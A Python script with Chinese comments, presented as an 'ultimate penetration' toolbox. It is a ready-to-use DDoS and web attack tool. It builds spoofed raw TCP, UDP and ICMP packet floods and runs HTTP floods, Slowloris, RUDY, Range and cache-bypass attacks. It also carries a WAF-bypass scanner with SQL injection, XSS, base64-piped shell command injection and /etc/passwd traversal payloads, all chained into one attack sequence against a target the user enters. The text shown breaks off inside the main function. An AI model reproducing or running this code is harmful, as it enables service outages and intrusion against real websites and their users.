#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import asyncio
import aiohttp
import socket
import struct
import random
import time
import json
import re
import ssl
import os
import sys
import threading
import hashlib
import base64
from urllib.parse import urlparse, quote, unquote
from dataclasses import dataclass, field
from typing import Dict, List, Tuple, Optional, Any
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
import warnings

warnings.filterwarnings('ignore')

# ==============================================================================
# 【异步HTTP客户端】支持万级并发
# ==============================================================================

class AsyncHTTPClient:
    """高性能异步HTTP客户端 - 连接池复用"""
    
    def __init__(self, max_connections: int = 10000, timeout: int = 10):
        self.max_connections = max_connections
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.connector = None
        self.session = None
        self._lock = asyncio.Lock()
        
    async def __aenter__(self):
        self.connector = aiohttp.TCPConnector(
            limit=self.max_connections,
            limit_per_host=0,  # 不限单主机并发
            ttl_dns_cache=300,
            ssl=False,
            force_close=False,
            enable_cleanup_closed=True
        )
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }
        )
        return self
    
    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()
        if self.connector:
            await self.connector.close()
    
    async def get(self, url: str, headers: Dict = None, proxy: str = None) -> Dict:
        """异步GET请求"""
        try:
            async with self.session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                text = await resp.text()
                return {
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "text": text,
                    "length": len(text)
                }
        except Exception as e:
            return {"status": 0, "error": str(e)}
    
    async def post(self, url: str, data: Dict = None, headers: Dict = None, proxy: str = None) -> Dict:
        """异步POST请求"""
        try:
            async with self.session.post(url, data=data, headers=headers, proxy=proxy, ssl=False) as resp:
                text = await resp.text()
                return {
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "text": text,
                    "length": len(text)
                }
        except Exception as e:
            return {"status": 0, "error": str(e)}


# ==============================================================================
# 【RAW Socket攻击引擎】绕过内核，手机也能发16亿包
# ==============================================================================

class RAWAttackEngine:
    """RAW Socket攻击引擎 - 绕过内核协议栈"""
    
    def __init__(self):
        self.running = False
        self.stats = {"sent": 0, "bytes": 0}
        self.lock = threading.Lock()
        
    def _checksum(self, data: bytes) -> int:
        """计算校验和"""
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    def _build_ip_header(self, src_ip: str, dst_ip: str, protocol: int = socket.IPPROTO_TCP) -> bytes:
        """构造IP头"""
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40  # IP头+TCP头
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, protocol, ip_check,
            ip_saddr, ip_daddr)
        
        ip_check = self._checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, protocol, ip_check,
            ip_saddr, ip_daddr)
        
        return ip_header
    
    def _build_tcp_header(self, src_ip: str, dst_ip: str, src_port: int, dst_port: int, 
                          seq: int, ack: int, flags: int) -> bytes:
        """构造TCP头"""
        tcp_offset = 5
        tcp_window = socket.htons(65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, dst_port, seq, ack,
            (tcp_offset << 4), flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        # 伪首部用于校验和
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        psh += tcp_header
        
        tcp_check = self._checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, dst_port, seq, ack,
            (tcp_offset << 4), flags, tcp_window,
            tcp_check, tcp_urg_ptr)
        
        return tcp_header
    
    def _build_udp_header(self, src_port: int, dst_port: int, data: bytes = b'') -> bytes:
        """构造UDP头"""
        udp_length = 8 + len(data)
        udp_check = 0
        return struct.pack('!HHHH', src_port, dst_port, udp_length, udp_check)
    
    def _build_icmp_echo(self, id: int, seq: int, data: bytes = b'') -> bytes:
        """构造ICMP Echo请求"""
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_check = 0
        icmp_id = id
        icmp_seq = seq
        
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
        icmp_check = self._checksum(icmp_header + data)
        return struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq) + data
    
    def syn_flood(self, target_ip: str, target_port: int, duration: float, rate: int = 100000):
        """SYN Flood - 每秒10万+包"""
        print(f"  [SYN Flood] 目标: {target_ip}:{target_port} | 速率: {rate}/s")
        
        self.running = True
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.settimeout(1)
        
        # 预生成IP池
        src_ips = [f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" 
                   for _ in range(1000)]
        
        batch_size = 100
        packets = []
        
        while time.time() - start_time < duration and self.running:
            for _ in range(batch_size):
                src_ip = random.choice(src_ips)
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                
                ip_header = self._build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP)
                tcp_header = self._build_tcp_header(src_ip, target_ip, src_port, target_port, seq, 0, 0x02)  # SYN
                packets.append(ip_header + tcp_header)
            
            # 批量发送
            try:
                for pkt in packets:
                    sock.sendto(pkt, (target_ip, 0))
                with self.lock:
                    self.stats["sent"] += len(packets)
                    self.stats["bytes"] += len(packets) * len(packets[0]) if packets else 0
            except:
                pass
            
            packets.clear()
            
            # 速率控制
            time.sleep(batch_size / rate)
        
        sock.close()
        self.running = False
    
    def ack_flood(self, target_ip: str, target_port: int, duration: float, rate: int = 100000):
        """ACK Flood"""
        print(f"  [ACK Flood] 目标: {target_ip}:{target_port} | 速率: {rate}/s")
        
        self.running = True
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        src_ips = [f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" 
                   for _ in range(1000)]
        
        batch_size = 100
        
        while time.time() - start_time < duration and self.running:
            for _ in range(batch_size):
                src_ip = random.choice(src_ips)
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                ack = random.randint(0, 4294967295)
                
                ip_header = self._build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP)
                tcp_header = self._build_tcp_header(src_ip, target_ip, src_port, target_port, seq, ack, 0x10)  # ACK
                
                try:
                    sock.sendto(ip_header + tcp_header, (target_ip, 0))
                    with self.lock:
                        self.stats["sent"] += 1
                except:
                    pass
            
            time.sleep(batch_size / rate)
        
        sock.close()
        self.running = False
    
    def rst_flood(self, target_ip: str, target_port: int, duration: float, rate: int = 100000):
        """RST Flood - 断开会话"""
        print(f"  [RST Flood] 目标: {target_ip}:{target_port} | 速率: {rate}/s")
        
        self.running = True
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        src_ips = [f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" 
                   for _ in range(1000)]
        
        batch_size = 100
        
        while time.time() - start_time < duration and self.running:
            for _ in range(batch_size):
                src_ip = random.choice(src_ips)
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                
                ip_header = self._build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP)
                tcp_header = self._build_tcp_header(src_ip, target_ip, src_port, target_port, seq, 0, 0x04)  # RST
                
                try:
                    sock.sendto(ip_header + tcp_header, (target_ip, 0))
                    with self.lock:
                        self.stats["sent"] += 1
                except:
                    pass
            
            time.sleep(batch_size / rate)
        
        sock.close()
        self.running = False
    
    def fin_flood(self, target_ip: str, target_port: int, duration: float, rate: int = 100000):
        """FIN Flood"""
        print(f"  [FIN Flood] 目标: {target_ip}:{target_port} | 速率: {rate}/s")
        
        self.running = True
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        src_ips = [f"{random.randint(1,223)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" 
                   for _ in range(1000)]
        
        batch_size = 100
        
        while time.time() - start_time < duration and self.running:
            for _ in range(batch_size):
                src_ip = random.choice(src_ips)
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                
                ip_header = self._build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP)
                tcp_header = self._build_tcp_header(src_ip, target_ip, src_port, target_port, seq, 0, 0x01)  # FIN
                
                try:
                    sock.sendto(ip_header + tcp_header, (target_ip, 0))
                    with self.lock:
                        self.stats["sent"] += 1
                except:
                    pass
            
            time.sleep(batch_size / rate)
        
        sock.close()
        self.running = False
    
    def udp_flood(self, target_ip: str, target_port: int, duration: float, rate: int = 50000, payload_size: int = 1024):
        """UDP Flood"""
        print(f"  [UDP Flood] 目标: {target_ip}:{target_port} | 速率: {rate}/s | 载荷: {payload_size}字节")
        
        self.running = True
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        payload = os.urandom(payload_size)
        batch_size = 50
        
        while time.time() - start_time < duration and self.running:
            for _ in range(batch_size):
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    with self.lock:
                        self.stats["sent"] += 1
                        self.stats["bytes"] += payload_size
                except:
                    pass
            
            time.sleep(batch_size / rate)
        
        sock.close()
        self.running = False
    
    def icmp_flood(self, target_ip: str, duration: float, rate: int = 50000, payload_size: int = 1472):
        """ICMP Flood (Ping of Death)"""
        print(f"  [ICMP Flood] 目标: {target_ip} | 速率: {rate}/s | 载荷: {payload_size}字节")
        
        self.running = True
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        payload = os.urandom(payload_size)
        batch_size = 50
        
        while time.time() - start_time < duration and self.running:
            for i in range(batch_size):
                try:
                    icmp_pkt = self._build_icmp_echo(random.randint(0, 65535), i, payload)
                    sock.sendto(icmp_pkt, (target_ip, 0))
                    with self.lock:
                        self.stats["sent"] += 1
                        self.stats["bytes"] += len(icmp_pkt)
                except:
                    pass
            
            time.sleep(batch_size / rate)
        
        sock.close()
        self.running = False
    
    def stop(self):
        self.running = False


# ==============================================================================
# 【HTTP攻击向量库】
# ==============================================================================

class HTTPAttackVectors:
    """HTTP层攻击向量"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.parsed = urlparse(target_url)
        self.running = False
        self.stats = {"requests": 0, "success": 0, "failed": 0, "rps": 0}
        self.lock = threading.Lock()
    
    async def _http_flood_worker(self, session: aiohttp.ClientSession, duration: float, 
                                  method: str = "GET", path_variations: bool = True):
        """HTTP Flood工作协程"""
        paths = ["/", "/index.html", "/api/v1/users", "/search?q=", "/login", "/admin", "/wp-admin"]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        ]
        
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                url = self.target_url
                if path_variations:
                    url = self.target_url.rstrip('/') + random.choice(paths)
                    if "?" not in url:
                        url += f"?_={random.randint(1, 9999999)}"
                
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    "Accept": "*/*",
                    "Cache-Control": "no-cache",
                }
                
                if method == "GET":
                    async with session.get(url, headers=headers, ssl=False) as resp:
                        await resp.read()
                        with self.lock:
                            self.stats["requests"] += 1
                            self.stats["success"] += 1
                else:
                    data = {"data": "x" * random.randint(100, 10000)}
                    async with session.post(url, data=data, headers=headers, ssl=False) as resp:
                        await resp.read()
                        with self.lock:
                            self.stats["requests"] += 1
                            self.stats["success"] += 1
                            
            except Exception:
                with self.lock:
                    self.stats["requests"] += 1
                    self.stats["failed"] += 1
            
            await asyncio.sleep(0)  # 让出控制权
    
    async def _slowloris_worker(self, target_host: str, target_port: int, duration: float, 
                                 use_ssl: bool = False):
        """Slowloris攻击 - 保持连接"""
        end_time = time.time() + duration
        sockets = []
        
        try:
            # 建立多个连接
            for _ in range(200):
                try:
                    reader, writer = await asyncio.open_connection(target_host, target_port, ssl=use_ssl)
                    
                    # 发送不完整的HTTP请求
                    request = f"GET /{random.randint(1,9999)} HTTP/1.1\r\n"
                    request += f"Host: {target_host}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += "Accept-language: en-US,en;q=0.5\r\n"
                    
                    writer.write(request.encode())
                    await writer.drain()
                    sockets.append((reader, writer))
                    
                    with self.lock:
                        self.stats["requests"] += 1
                except:
                    pass
            
            # 保持连接
            while time.time() < end_time and self.running:
                for reader, writer in list(sockets):
                    try:
                        writer.write(f"X-a: {random.randint(1,9999)}\r\n".encode())
                        await writer.drain()
                        with self.lock:
                            self.stats["success"] += 1
                    except:
                        sockets.remove((reader, writer))
                
                await asyncio.sleep(random.randint(5, 15))
                
        finally:
            for _, writer in sockets:
                try:
                    writer.close()
                except:
                    pass
    
    async def _rudy_worker(self, target_host: str, target_port: int, duration: float, use_ssl: bool = False):
        """R-U-Dead-Yet攻击 - 慢速POST"""
        end_time = time.time() + duration
        sockets = []
        
        try:
            for _ in range(100):
                try:
                    reader, writer = await asyncio.open_connection(target_host, target_port, ssl=use_ssl)
                    
                    content_length = 1000000
                    request = f"POST / HTTP/1.1\r\n"
                    request += f"Host: {target_host}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n"
                    request += f"Content-Length: {content_length}\r\n"
                    request += "Content-Type: application/x-www-form-urlencoded\r\n"
                    request += "\r\n"
                    
                    writer.write(request.encode())
                    await writer.drain()
                    sockets.append((reader, writer, content_length, 0))
                    
                    with self.lock:
                        self.stats["requests"] += 1
                except:
                    pass
            
            while time.time() < end_time and self.running:
                for reader, writer, total, sent in list(sockets):
                    try:
                        chunk = b'x' * random.randint(1, 10)
                        writer.write(chunk)
                        await writer.drain()
                        sent += len(chunk)
                        
                        if sent >= total:
                            sockets.remove((reader, writer, total, sent))
                        else:
                            idx = sockets.index((reader, writer, total, sent))
                            sockets[idx] = (reader, writer, total, sent)
                        
                        with self.lock:
                            self.stats["success"] += 1
                    except:
                        sockets.remove((reader, writer, total, sent))
                
                await asyncio.sleep(random.randint(10, 30))
                
        finally:
            for _, writer, _, _ in sockets:
                try:
                    writer.close()
                except:
                    pass
    
    async def _range_attack_worker(self, session: aiohttp.ClientSession, duration: float):
        """Range Header攻击 - 请求大量分片"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                headers = {
                    "Range": f"bytes={random.randint(0,100)}-{random.randint(1000,10000)},{random.randint(0,100)}-{random.randint(1000,10000)}",
                    "Accept-Encoding": "identity"
                }
                
                async with session.get(self.target_url, headers=headers, ssl=False) as resp:
                    await resp.read()
                    with self.lock:
                        self.stats["requests"] += 1
                        self.stats["success"] += 1
            except:
                with self.lock:
                    self.stats["failed"] += 1
            
            await asyncio.sleep(0)
    
    async def _cache_bypass_worker(self, session: aiohttp.ClientSession, duration: float):
        """缓存绕过攻击 - 随机参数绕过CDN缓存"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                # 随机参数绕过缓存
                url = self.target_url
                if "?" in url:
                    url += f"&_={random.random()}&{random.randint(1,9999)}={random.random()}"
                else:
                    url += f"?_={random.random()}&{random.randint(1,9999)}={random.random()}"
                
                headers = {
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "Pragma": "no-cache",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                }
                
                async with session.get(url, headers=headers, ssl=False) as resp:
                    await resp.read()
                    with self.lock:
                        self.stats["requests"] += 1
                        self.stats["success"] += 1
            except:
                with self.lock:
                    self.stats["failed"] += 1
            
            await asyncio.sleep(0)
    
    async def http_flood(self, duration: int, concurrency: int = 10000, method: str = "GET"):
        """HTTP Flood - 万级并发"""
        print(f"  [HTTP Flood] 并发: {concurrency} | 时长: {duration}s")
        
        self.running = True
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False, force_close=True)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self._http_flood_worker(session, duration, method, True) for _ in range(concurrency)]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.running = False
    
    async def slowloris(self, duration: int):
        """Slowloris攻击"""
        print(f"  [Slowloris] 时长: {duration}s")
        
        self.running = True
        host = self.parsed.hostname
        port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        use_ssl = self.parsed.scheme == "https"
        
        await self._slowloris_worker(host, port, duration, use_ssl)
        self.running = False
    
    async def rudy(self, duration: int):
        """RUDY攻击"""
        print(f"  [RUDY] 时长: {duration}s")
        
        self.running = True
        host = self.parsed.hostname
        port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        use_ssl = self.parsed.scheme == "https"
        
        await self._rudy_worker(host, port, duration, use_ssl)
        self.running = False
    
    async def range_attack(self, duration: int, concurrency: int = 5000):
        """Range攻击"""
        print(f"  [Range Attack] 并发: {concurrency} | 时长: {duration}s")
        
        self.running = True
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self._range_attack_worker(session, duration) for _ in range(concurrency)]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.running = False
    
    async def cache_bypass(self, duration: int, concurrency: int = 5000):
        """缓存绕过攻击"""
        print(f"  [Cache Bypass] 并发: {concurrency} | 时长: {duration}s")
        
        self.running = True
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self._cache_bypass_worker(session, duration) for _ in range(concurrency)]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.running = False
    
    def stop(self):
        self.running = False


# ==============================================================================
# 【智能WAF绕过扫描器】异步高性能版
# ==============================================================================

class SmartWAFBypassScanner:
    """智能WAF绕过扫描器"""
    
    def __init__(self):
        self.waf_fingerprints = {
            "Cloudflare": {"headers": ["cf-ray"], "bypass": ["分块传输", "HTTP/2", "源站泄露"]},
            "阿里云WAF": {"headers": ["X-Security-Error"], "bypass": ["IP伪造", "参数污染", "编码绕过"]},
            "腾讯云WAF": {"headers": ["X-Tencent-WAF"], "bypass": ["慢速攻击", "WebSocket"]},
            "安全狗": {"headers": ["X-SafeDog"], "bypass": ["双写绕过", "内联注释"]},
            "宝塔WAF": {"headers": ["X-Bt-WAF"], "bypass": ["XFF伪造", "双重编码"]},
        }
        
        self.bypass_payloads = self._generate_bypass_payloads()
    
    def _generate_bypass_payloads(self) -> List[Dict]:
        """生成绕过Payload"""
        payloads = []
        
        # SQL注入绕过
        sql_base = ["' OR '1'='1", "1' AND '1'='1", "' UNION SELECT NULL--"]
        sql_bypass = [
            ("大小写", lambda p: p.replace("SELECT", "SeLeCt")),
            ("内联注释", lambda p: p.replace("SELECT", "/*!50000SELECT*/")),
            ("双重编码", lambda p: quote(quote(p))),
            ("宽字节", lambda p: "%df" + p),
        ]
        
        for base in sql_base:
            for name, func in sql_bypass:
                payloads.append({
                    "category": "SQL注入",
                    "name": name,
                    "payload": func(base),
                    "detect": ["syntax error", "mysql", "SQL"]
                })
        
        # XSS绕过
        xss_base = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
        xss_bypass = [
            ("大小写", lambda p: p.replace("script", "ScRiPt")),
            ("HTML实体", lambda p: p.replace("<", "&lt;")),
            ("SVG", lambda p: "<svg/onload=alert(1)>"),
        ]
        
        for base in xss_base:
            for name, func in xss_bypass:
                payloads.append({
                    "category": "XSS",
                    "name": name,
                    "payload": func(base),
                    "detect": ["alert(1)", "onerror"]
                })
        
        # 命令注入绕过
        cmd_base = ["; ls", "| ls", "`id`"]
        cmd_bypass = [
            ("IFS", lambda p: p.replace(" ", "${IFS}")),
            ("Base64", lambda p: f"echo {base64.b64encode(p[2:].encode()).decode()}|base64 -d|sh"),
            ("换行符", lambda p: p.replace(" ", "%0a")),
        ]
        
        for base in cmd_base:
            for name, func in cmd_bypass:
                payloads.append({
                    "category": "命令注入",
                    "name": name,
                    "payload": func(base),
                    "detect": ["uid=", "gid=", "root:"]
                })
        
        # 路径遍历绕过
        lfi_base = ["../../etc/passwd", "....//....//etc/passwd"]
        lfi_bypass = [
            ("双写", lambda p: p.replace("..", "....")),
            ("Unicode", lambda p: p.replace("..", "..%c0%af")),
            ("URL编码", lambda p: quote(p)),
        ]
        
        for base in lfi_base:
            for name, func in lfi_bypass:
                payloads.append({
                    "category": "路径遍历",
                    "name": name,
                    "payload": func(base),
                    "detect": ["root:x:0:0"]
                })
        
        return payloads
    
    async def _probe(self, client: AsyncHTTPClient, url: str, payload: Dict) -> Dict:
        """异步探测"""
        test_url = f"{url}?id={quote(payload['payload'])}"
        resp = await client.get(test_url)
        
        result = {
            "category": payload["category"],
            "name": payload["name"],
            "status": resp.get("status", 0),
            "blocked": resp.get("status", 0) in [403, 406, 429, 503],
            "vuln": False
        }
        
        if not result["blocked"] and "detect" in payload:
            text = resp.get("text", "").lower()
            for pattern in payload["detect"]:
                if pattern.lower() in text:
                    result["vuln"] = True
                    result["pattern"] = pattern
                    break
        
        return result
    
    async def scan(self, target_url: str, max_probes: int = 1000, concurrency: int = 500) -> Dict:
        """异步扫描"""
        print(f"\n  [智能WAF扫描] 目标: {target_url}")
        print(f"  [智能WAF扫描] 并发: {concurrency} | 探测数: {max_probes}")
        
        async with AsyncHTTPClient(max_connections=concurrency) as client:
            # 先探测WAF
            resp = await client.get(target_url)
            waf_detected = []
            for waf, fp in self.waf_fingerprints.items():
                for header in fp["headers"]:
                    if header.lower() in str(resp.get("headers", {})).lower():
                        waf_detected.append(waf)
                        break
            
            if waf_detected:
                print(f"  [检测到WAF] {', '.join(waf_detected)}")
            
            # 批量探测
            probes = random.sample(self.bypass_payloads, min(max_probes, len(self.bypass_payloads)))
            
            semaphore = asyncio.Semaphore(concurrency)
            
            async def bounded_probe(p):
                async with semaphore:
                    return await self._probe(client, target_url, p)
            
            tasks = [bounded_probe(p) for p in probes]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # 统计结果
            vulns = [r for r in results if isinstance(r, dict) and r.get("vuln")]
            blocked = [r for r in results if isinstance(r, dict) and r.get("blocked")]
            
            return {
                "waf": waf_detected,
                "total": len(probes),
                "blocked": len(blocked),
                "vulnerabilities": vulns,
                "bypass_success": [r for r in results if isinstance(r, dict) and not r.get("blocked")],
            }


# ==============================================================================
# 【主控制器】整合所有功能
# ==============================================================================

class UltimateAttackController:
    """终极攻击控制器"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.parsed = urlparse(target_url)
        self.target_ip = None
        self.target_port = None
        
        self.scanner = SmartWAFBypassScanner()
        self.http_attacker = HTTPAttackVectors(target_url)
        self.raw_attacker = RAWAttackEngine()
        
        self.scan_results = {}
        self.attack_stats = {"start": 0, "requests": 0, "bytes": 0}
    
    def resolve_target(self) -> bool:
        """解析目标"""
        try:
            self.target_ip = socket.gethostbyname(self.parsed.hostname)
            self.target_port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
            print(f"\n  目标解析: {self.parsed.hostname} → {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            print(f"  解析失败: {e}")
            return False
    
    async def run_scan_phase(self):
        """第一阶段：智能扫描"""
        print(f"\n{'='*60}")
        print(f"  第一阶段：智能WAF扫描")
        print(f"{'='*60}")
        
        self.scan_results = await self.scanner.scan(self.target_url, max_probes=500, concurrency=200)
        
        print(f"\n  【扫描结果】")
        print(f"    WAF: {self.scan_results.get('waf', ['无'])}")
        print(f"    探测: {self.scan_results['total']}")
        print(f"    拦截: {self.scan_results['blocked']} ({round(self.scan_results['blocked']/self.scan_results['total']*100, 1)}%)")
        print(f"    漏洞: {len(self.scan_results['vulnerabilities'])}")
        print(f"    绕过成功: {len(self.scan_results['bypass_success'])}")
    
    async def run_bypass_attack_phase(self):
        """第二阶段：绕过攻击"""
        print(f"\n{'='*60}")
        print(f"  第二阶段：绕过攻击")
        print(f"{'='*60}")
        
        # 使用成功绕过的Payload进行攻击
        if self.scan_results.get('bypass_success'):
            print(f"  使用 {len(self.scan_results['bypass_success'][:10])} 个成功绕过Payload")
            await self.http_attacker.http_flood(duration=30, concurrency=5000, method="GET")
        else:
            print(f"  使用默认绕过技术")
            await self.http_attacker.cache_bypass(duration=30, concurrency=3000)
    
    def run_ddos_phase(self, attack_type: str = "all", duration: int = 60):
        """第三阶段：DDoS攻击"""
        print(f"\n{'='*60}")
        print(f"  第三阶段：DDoS饱和攻击")
        print(f"{'='*60}")
        
        if not self.target_ip:
            print("  目标未解析")
            return
        
        threads = []
        
        if attack_type in ["syn", "all"]:
            t = threading.Thread(target=self.raw_attacker.syn_flood, 
                                args=(self.target_ip, self.target_port, duration, 100000))
            threads.append(t)
        
        if attack_type in ["ack", "all"]:
            t = threading.Thread(target=self.raw_attacker.ack_flood,
                                args=(self.target_ip, self.target_port, duration, 50000))
            threads.append(t)
        
        if attack_type in ["rst", "all"]:
            t = threading.Thread(target=self.raw_attacker.rst_flood,
                                args=(self.target_ip, self.target_port, duration, 50000))
            threads.append(t)
        
        if attack_type in ["udp", "all"]:
            t = threading.Thread(target=self.raw_attacker.udp_flood,
                                args=(self.target_ip, self.target_port, duration, 30000, 1024))
            threads.append(t)
        
        if attack_type in ["icmp", "all"]:
            t = threading.Thread(target=self.raw_attacker.icmp_flood,
                                args=(self.target_ip, duration, 30000))
            threads.append(t)
        
        for t in threads:
            t.daemon = True
            t.start()
        
        start = time.time()
        while time.time() - start < duration:
            time.sleep(2)
            elapsed = int(time.time() - start)
            print(f"\r  [攻击中] 已发送: {self.raw_attacker.stats['sent']:,} | 剩余: {duration-elapsed}s", end="")
        
        self.raw_attacker.stop()
        for t in threads:
            t.join(timeout=2)
        
        print(f"\n\n  【DDoS完成】总发包: {self.raw_attacker.stats['sent']:,}")
    
    async def run_http_ddos_phase(self, attack_type: str = "http_flood", duration: int = 60):
        """HTTP层DDoS"""
        print(f"\n{'='*60}")
        print(f"  第三阶段：HTTP层DDoS")
        print(f"{'='*60}")
        
        if attack_type == "http_flood":
            await self.http_attacker.http_flood(duration, concurrency=10000)
        elif attack_type == "slowloris":
            await self.http_attacker.slowloris(duration)
        elif attack_type == "rudy":
            await self.http_attacker.rudy(duration)
        elif attack_type == "range":
            await self.http_attacker.range_attack(duration, concurrency=5000)
        elif attack_type == "cache":
            await self.http_attacker.cache_bypass(duration, concurrency=5000)
        elif attack_type == "all":
            # 混合攻击
            tasks = [
                self.http_attacker.http_flood(duration, concurrency=3000),
                self.http_attacker.cache_bypass(duration, concurrency=2000),
                self.http_attacker.range_attack(duration, concurrency=2000),
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
        
        print(f"\n  【HTTP DDoS完成】请求: {self.http_attacker.stats['requests']:,} | 成功: {self.http_attacker.stats['success']:,}")
    
    async def run_full_attack(self, 
                              scan: bool = True,
                              bypass: bool = True,
                              ddos_type: str = "all",
                              duration: int = 60):
        """执行完整攻击链"""
        print(f"\n{'#'*70}")
        print(f"  【小神工具箱 · 终极渗透版】")
        print(f"  目标: {self.target_url}")
        print(f"  时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'#'*70}")
        
        if not self.resolve_target():
            return
        
        # 第一阶段：扫描
        if scan:
            await self.run_scan_phase()
        
        # 第二阶段：绕过攻击
        if bypass:
            await self.run_bypass_attack_phase()
        
        # 第三阶段：DDoS
        if ddos_type in ["http_flood", "slowloris", "rudy", "range", "cache", "all_http"]:
            await self.run_http_ddos_phase(ddos_type.replace("all_http", "all"), duration)
        else:
            self.run_ddos_phase(ddos_type, duration)
        
        print(f"\n{'#'*70}")
        print(f"  【攻击链完成】")
        print(f"{'#'*70}\n")


# ==============================================================================
# 主函数
# ==============================================================================

async def main_async():
    print(f"\n{'#'*70}")
    print(f"  【小神工具箱 · 终极渗透版 (手机优化)】")
    print(f"  异步I/O + RAW Socket | 发")
    print(f"{'#'*70}")
    print(f"\n  \033[91m⚠ 警告：仅供授权安全测试！\033[0m\n")
    
    target = input("  输入目标URL: ").strip()
